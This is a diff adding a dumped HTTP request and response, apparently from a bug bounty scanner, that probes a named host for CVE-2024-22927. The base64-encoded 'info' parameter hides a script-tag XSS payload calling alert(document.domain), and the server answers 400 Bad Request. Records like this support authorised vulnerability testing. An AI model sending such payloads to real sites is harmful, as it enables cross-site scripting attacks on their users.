@@ -1,0 +1,26 @@
+[CVE-2024-22927] Dumped HTTP request for https://techsolutions.bitpanda.com/login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn
+
+
+POST /login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+Connection: close
+Content-Length: 0
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2024-22927] Dumped HTTP response https://techsolutions.bitpanda.com/login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Via: 1.1 de8b5f44ffbaf97a58ad36dbe4a4a7c0.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 7o_QpPzxSYH5d99pB8p1dt1R3Z-QkrVpkQPSTjaYlnrY8eEZTFIwvg==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
